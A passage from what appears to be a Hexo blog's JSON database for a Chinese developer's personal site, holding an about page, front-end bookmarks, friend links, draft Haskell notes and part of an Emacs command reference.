12a37cca3d72ca4ec292f","modified":1479555318000},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"61d8d967807ef12598d81582fa95b9f600c3ee01","modified":1479555318000},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1479555318000},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"c0522272bbaef2acb3d341912754d6ea2d0ecfc0","modified":1479555318000}],"Category":[{"name":"github","_id":"civym300e0009cdon6m9k7for"},{"name":"docker","_id":"civym300o000fcdonr5qfmkhq"},{"name":"Mac","_id":"civym300r000lcdonqmasczma"},{"name":"hack","_id":"civym300u000scdon3dj2w38p"},{"name":"Hack","_id":"civym30110010cdon4juz0m2x"},{"name":"Github","_id":"civym30180018cdonk7ff8vtr"},{"name":"Sql","_id":"civym301d001fcdondrranodf"},{"name":"Web","_id":"civym301i001ncdonlf5tbmrh"},{"name":"Raspberry","_id":"civym301q0022cdontoblnk47"},{"name":"笑话","_id":"civym301x0028cdonqxb6m4pv"},{"name":"Linux","_id":"civym301z002dcdonplilzqgb"}],"Data":[],"Page":[{"title":"关于","id":8,"date":"2016-09-25T23:27:35.000Z","_content":"# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\nUniversity of Birmingham\n\n# 生活方式\n\n* 爱好Web前端\n* 爱好渗透测试\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* TAB档，除了用python的时候\n* github的star各种人的狂魔\n* Cnbeta党\n* Mac党，中度果粉\n* 知乎狂魔\n* 曾经的OIer，算法小渣渣\n* 曾经混过百度空间、饭否、远景论坛\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n\n","source":"about/index.md","raw":"---\ntitle: 关于\npermalink: about\nid: 8\ndate: 2016-09-26 00:27:35\n---\n# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\nUniversity of Birmingham\n\n# 生活方式\n\n* 爱好Web前端\n* 爱好渗透测试\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* TAB档，除了用python的时候\n* github的star各种人的狂魔\n* Cnbeta党\n* Mac党，中度果粉\n* 知乎狂魔\n* 曾经的OIer，算法小渣渣\n* 曾经混过百度空间、饭否、远景论坛\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n\n","updated":"2016-11-21T19:49:48.000Z","path":"about.html","comments":1,"layout":"page","_id":"civym2zzy0001cdon6vs0ip5t","content":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>University of Birmingham</p>\n<h1 id=\"生活方式\"><a href=\"#生活方式\" class=\"headerlink\" title=\"生活方式\"></a>生活方式</h1><ul>\n<li>爱好Web前端</li>\n<li>爱好渗透测试</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>TAB档，除了用python的时候</li>\n<li>github的star各种人的狂魔</li>\n<li>Cnbeta党</li>\n<li>Mac党，中度果粉</li>\n<li>知乎狂魔</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>曾经混过百度空间、饭否、远景论坛</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\" target=\"_blank\" rel=\"external\">点击进入…</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>University of Birmingham</p>\n<h1 id=\"生活方式\"><a href=\"#生活方式\" class=\"headerlink\" title=\"生活方式\"></a>生活方式</h1><ul>\n<li>爱好Web前端</li>\n<li>爱好渗透测试</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>TAB档，除了用python的时候</li>\n<li>github的star各种人的狂魔</li>\n<li>Cnbeta党</li>\n<li>Mac党，中度果粉</li>\n<li>知乎狂魔</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>曾经混过百度空间、饭否、远景论坛</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\">点击进入…</a></li>\n</ul>\n"},{"title":"前端收藏夹","id":7,"updated":"2016-08-17T18:53:28.000Z","date":"2016-07-30T23:27:35.000Z","_content":"\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [PDF.JS 加载pdf](http://mozilla.github.io/pdf.js)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [Vim 初探](http://imweb.io/topic/579deaee93d9938132cc8d88)\n* [[译] 使用 Zopfli 优化 PNG 图片](https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 文档\n* [Hexo](https://hexo.io/zh-cn/docs/)\n\n# 文章\n* [通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算](https://zhuanlan.zhihu.com/p/21650547)\n* [如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你](https://zhuanlan.zhihu.com/p/21490434)\n* [前端面试大全](https://segmentfault.com/a/1190000005947094)\n* [前端跨域及其解决方案](http://tech.jandou.com/cross-domain.html)\n* [30分钟git命令入门到放弃](http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/)\n* [(Canvas) 前端如何呼风唤雨](http://imweb.io/topic/55e32fd5771670e207a16bb9)\n* [如何构建一支专业的前端开发团队（一）\n](https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)\n* [Nodejs学习日志（一）——cheerio爬虫](http://molunerfinn.com/nodejs-1/)\n* [如何打造一个令人愉悦的前端开发环境（一）](https://segmentfault.com/a/1190000006157372)\n* [如何让你的网页打开速度降低到1s内](http://www.jianshu.com/p/d857c3ff78d6)","source":"fav/index.md","raw":"---\ntitle: 前端收藏夹\npermalink: fav\nid: 7\nupdated: '2016-08-17 19:53:28'\ndate: 2016-07-31 00:27:35\n---\n\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [PDF.JS 加载pdf](http://mozilla.github.io/pdf.js)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [Vim 初探](http://imweb.io/topic/579deaee93d9938132cc8d88)\n* [[译] 使用 Zopfli 优化 PNG 图片](https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 文档\n* [Hexo](https://hexo.io/zh-cn/docs/)\n\n# 文章\n* [通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算](https://zhuanlan.zhihu.com/p/21650547)\n* [如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你](https://zhuanlan.zhihu.com/p/21490434)\n* [前端面试大全](https://segmentfault.com/a/1190000005947094)\n* [前端跨域及其解决方案](http://tech.jandou.com/cross-domain.html)\n* [30分钟git命令入门到放弃](http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/)\n* [(Canvas) 前端如何呼风唤雨](http://imweb.io/topic/55e32fd5771670e207a16bb9)\n* [如何构建一支专业的前端开发团队（一）\n](https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)\n* [Nodejs学习日志（一）——cheerio爬虫](http://molunerfinn.com/nodejs-1/)\n* [如何打造一个令人愉悦的前端开发环境（一）](https://segmentfault.com/a/1190000006157372)\n* [如何让你的网页打开速度降低到1s内](http://www.jianshu.com/p/d857c3ff78d6)","path":"fav.html","comments":1,"layout":"page","_id":"civym30010003cdonmg278g9h","content":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\" target=\"_blank\" rel=\"external\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\" target=\"_blank\" rel=\"external\">imweb前端社区</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\" target=\"_blank\" rel=\"external\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\" target=\"_blank\" rel=\"external\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"http://mozilla.github.io/pdf.js\" target=\"_blank\" rel=\"external\">PDF.JS 加载pdf</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\" target=\"_blank\" rel=\"external\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\" target=\"_blank\" rel=\"external\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://imweb.io/topic/579deaee93d9938132cc8d88\" target=\"_blank\" rel=\"external\">Vim 初探</a></li>\n<li><a href=\"https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md\" target=\"_blank\" rel=\"external\">[译] 使用 Zopfli 优化 PNG 图片</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\" target=\"_blank\" rel=\"external\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\" target=\"_blank\" rel=\"external\">前端工具箱chrome插件</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\" target=\"_blank\" rel=\"external\">easyicon</a></li>\n<li><a href=\"https://xituqu.com/\" target=\"_blank\" rel=\"external\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\" target=\"_blank\" rel=\"external\">优设</a></li>\n<li><a href=\"https://marketplace.500px.com/\" target=\"_blank\" rel=\"external\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\" target=\"_blank\" rel=\"external\">壁纸wallhaven</a></li>\n<li><a href=\"http://www.htmleaf.com/\" target=\"_blank\" rel=\"external\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\" target=\"_blank\" rel=\"external\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\" target=\"_blank\" rel=\"external\">控制面板</a></li>\n</ul>\n<h1 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h1><ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"external\">Hexo</a></li>\n</ul>\n<h1 id=\"文章\"><a href=\"#文章\" class=\"headerlink\" title=\"文章\"></a>文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21650547\" target=\"_blank\" rel=\"external\">通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21490434\" target=\"_blank\" rel=\"external\">如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000005947094\" target=\"_blank\" rel=\"external\">前端面试大全</a></li>\n<li><a href=\"http://tech.jandou.com/cross-domain.html\" target=\"_blank\" rel=\"external\">前端跨域及其解决方案</a></li>\n<li><a href=\"http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/\" target=\"_blank\" rel=\"external\">30分钟git命令入门到放弃</a></li>\n<li><a href=\"http://imweb.io/topic/55e32fd5771670e207a16bb9\" target=\"_blank\" rel=\"external\">(Canvas) 前端如何呼风唤雨</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io\" target=\"_blank\" rel=\"external\">如何构建一支专业的前端开发团队（一）\n</a></li>\n<li><a href=\"http://molunerfinn.com/nodejs-1/\" target=\"_blank\" rel=\"external\">Nodejs学习日志（一）——cheerio爬虫</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006157372\" target=\"_blank\" rel=\"external\">如何打造一个令人愉悦的前端开发环境（一）</a></li>\n<li><a href=\"http://www.jianshu.com/p/d857c3ff78d6\" target=\"_blank\" rel=\"external\">如何让你的网页打开速度降低到1s内</a></li>\n</ul>\n","excerpt":"","more":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\">imweb前端社区</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"http://mozilla.github.io/pdf.js\">PDF.JS 加载pdf</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://imweb.io/topic/579deaee93d9938132cc8d88\">Vim 初探</a></li>\n<li><a href=\"https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md\">[译] 使用 Zopfli 优化 PNG 图片</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\">前端工具箱chrome插件</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\">easyicon</a></li>\n<li><a href=\"https://xituqu.com/\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\">优设</a></li>\n<li><a href=\"https://marketplace.500px.com/\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\">壁纸wallhaven</a></li>\n<li><a href=\"http://www.htmleaf.com/\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\">控制面板</a></li>\n</ul>\n<h1 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h1><ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\">Hexo</a></li>\n</ul>\n<h1 id=\"文章\"><a href=\"#文章\" class=\"headerlink\" title=\"文章\"></a>文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21650547\">通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21490434\">如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000005947094\">前端面试大全</a></li>\n<li><a href=\"http://tech.jandou.com/cross-domain.html\">前端跨域及其解决方案</a></li>\n<li><a href=\"http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/\">30分钟git命令入门到放弃</a></li>\n<li><a href=\"http://imweb.io/topic/55e32fd5771670e207a16bb9\">(Canvas) 前端如何呼风唤雨</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io\">如何构建一支专业的前端开发团队（一）\n</a></li>\n<li><a href=\"http://molunerfinn.com/nodejs-1/\">Nodejs学习日志（一）——cheerio爬虫</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006157372\">如何打造一个令人愉悦的前端开发环境（一）</a></li>\n<li><a href=\"http://www.jianshu.com/p/d857c3ff78d6\">如何让你的网页打开速度降低到1s内</a></li>\n</ul>\n"},{"title":"友情链接","id":8,"date":"2016-09-25T23:27:35.000Z","_content":"# 友情链接\n\n## 百度空间好友\n\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [幽虫博客](https://luoyandi.wordpress.com/)\n* [胡戈戈](http://hugege.com)\n* [safe121](http://www.safe121.com)\n* [Panda熊猫](http://www.panda-studio.cn/)\n* [lzlhoho](http://lzlhoho.zcool.com.cn/)\n* [52abc/xinzhixiang](http://xxz.cc)\n* [Monyer](http://monyer.com/)\n\n## 生活好友\n\n* [Wayne Yan](http://yw1994.github.io)\n* [Echowxsy](http://blog.echowxsy.com/)\n* [rjgeek](http://rjgeek.github.io/)\n","source":"link/index.md","raw":"---\ntitle: 友情链接\npermalink: link\nid: 8\ndate: 2016-09-26 00:27:35\n---\n# 友情链接\n\n## 百度空间好友\n\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [幽虫博客](https://luoyandi.wordpress.com/)\n* [胡戈戈](http://hugege.com)\n* [safe121](http://www.safe121.com)\n* [Panda熊猫](http://www.panda-studio.cn/)\n* [lzlhoho](http://lzlhoho.zcool.com.cn/)\n* [52abc/xinzhixiang](http://xxz.cc)\n* [Monyer](http://monyer.com/)\n\n## 生活好友\n\n* [Wayne Yan](http://yw1994.github.io)\n* [Echowxsy](http://blog.echowxsy.com/)\n* [rjgeek](http://rjgeek.github.io/)\n","updated":"2016-11-21T20:15:10.000Z","path":"link.html","comments":1,"layout":"page","_id":"civym30040005cdonzcvq308c","content":"<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><h2 id=\"百度空间好友\"><a href=\"#百度空间好友\" class=\"headerlink\" title=\"百度空间好友\"></a>百度空间好友</h2><ul>\n<li><a href=\"http://fuxiaohei.me/\" target=\"_blank\" rel=\"external\">Fuxiaohei</a></li>\n<li><a href=\"https://luoyandi.wordpress.com/\" target=\"_blank\" rel=\"external\">幽虫博客</a></li>\n<li><a href=\"http://hugege.com\" target=\"_blank\" rel=\"external\">胡戈戈</a></li>\n<li><a href=\"http://www.safe121.com\" target=\"_blank\" rel=\"external\">safe121</a></li>\n<li><a href=\"http://www.panda-studio.cn/\" target=\"_blank\" rel=\"external\">Panda熊猫</a></li>\n<li><a href=\"http://lzlhoho.zcool.com.cn/\" target=\"_blank\" rel=\"external\">lzlhoho</a></li>\n<li><a href=\"http://xxz.cc\" target=\"_blank\" rel=\"external\">52abc/xinzhixiang</a></li>\n<li><a href=\"http://monyer.com/\" target=\"_blank\" rel=\"external\">Monyer</a></li>\n</ul>\n<h2 id=\"生活好友\"><a href=\"#生活好友\" class=\"headerlink\" title=\"生活好友\"></a>生活好友</h2><ul>\n<li><a href=\"http://yw1994.github.io\" target=\"_blank\" rel=\"external\">Wayne Yan</a></li>\n<li><a href=\"http://blog.echowxsy.com/\" target=\"_blank\" rel=\"external\">Echowxsy</a></li>\n<li><a href=\"http://rjgeek.github.io/\" target=\"_blank\" rel=\"external\">rjgeek</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><h2 id=\"百度空间好友\"><a href=\"#百度空间好友\" class=\"headerlink\" title=\"百度空间好友\"></a>百度空间好友</h2><ul>\n<li><a href=\"http://fuxiaohei.me/\">Fuxiaohei</a></li>\n<li><a href=\"https://luoyandi.wordpress.com/\">幽虫博客</a></li>\n<li><a href=\"http://hugege.com\">胡戈戈</a></li>\n<li><a href=\"http://www.safe121.com\">safe121</a></li>\n<li><a href=\"http://www.panda-studio.cn/\">Panda熊猫</a></li>\n<li><a href=\"http://lzlhoho.zcool.com.cn/\">lzlhoho</a></li>\n<li><a href=\"http://xxz.cc\">52abc/xinzhixiang</a></li>\n<li><a href=\"http://monyer.com/\">Monyer</a></li>\n</ul>\n<h2 id=\"生活好友\"><a href=\"#生活好友\" class=\"headerlink\" title=\"生活好友\"></a>生活好友</h2><ul>\n<li><a href=\"http://yw1994.github.io\">Wayne Yan</a></li>\n<li><a href=\"http://blog.echowxsy.com/\">Echowxsy</a></li>\n<li><a href=\"http://rjgeek.github.io/\">rjgeek</a></li>\n</ul>\n"},{"layout":"tags","noDate":true,"comments":0,"_content":"","source":"tags/index.md","raw":"---\nlayout: tags\nnoDate: true\ncomments: false\n---\n","date":"2016-11-19T11:35:18.000Z","updated":"2016-11-19T11:35:18.000Z","path":"tags/index.html","title":"","_id":"civym30350030cdon225fjo77","content":"","excerpt":"","more":""}],"Post":[{"title":"Haskell 手记（一）","id":"18","updated":"2016-09-01T00:14:45.000Z","_content":"\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ [5]\n\n\n\n\n","source":"_drafts/Haskell-手记（一）.md","raw":"---\ntitle: Haskell 手记（一）\npermalink: haskell-shou-ji-yi\nid: 18\nupdated: '2016-09-01 01:14:45'\ntags:\n---\n\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ [5]\n\n\n\n\n","slug":"haskell-shou-ji-yi","published":0,"date":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym2zzv0000cdon6193jbb3","content":"<p>#安装<br><a href=\"https://www.haskell.org/\" target=\"_blank\" rel=\"external\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n","excerpt":"","more":"<p>#安装<br><a href=\"https://www.haskell.org/\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n"},{"title":"Emacs 命令大全","id":"5","updated":"2016-08-05T20:14:03.000Z","date":"2016-07-29T01:10:07.000Z","_content":"\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 